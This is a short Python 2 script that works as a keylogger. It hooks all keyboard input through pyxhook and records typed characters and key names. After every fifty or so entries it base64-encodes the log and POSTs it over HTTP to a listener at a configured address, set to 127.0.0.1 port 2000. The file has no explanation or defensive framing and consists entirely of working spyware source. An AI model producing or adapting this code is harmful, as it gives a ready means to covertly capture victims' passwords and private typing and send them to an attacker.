#!/usr/bin/env python2

import requests
import pyxhook
import base64

IP = "127.0.0.1"
PORT = "2000"

if __name__ == '__main__':
    log = ""
    line_counter = 50
    def OnKeyPress(event):
        global log
        global line_counter
        if len(log) >= line_counter:
            try:
                print "sending..."
                r = requests.post("http://" + IP + ":" + PORT + "/", data=base64.b64encode(log))
                log = ""
                line_counter = 50
            except:
                print "Failed..."
                line_counter += 50
        if event.Ascii > 31 and event.Ascii < 126:
            log += chr(event.Ascii)
        else:
            log += "\n[" + event.Key + "]"

    new_hook=pyxhook.HookManager()
    new_hook.KeyDown=OnKeyPress
    new_hook.HookKeyboard()
    new_hook.start()
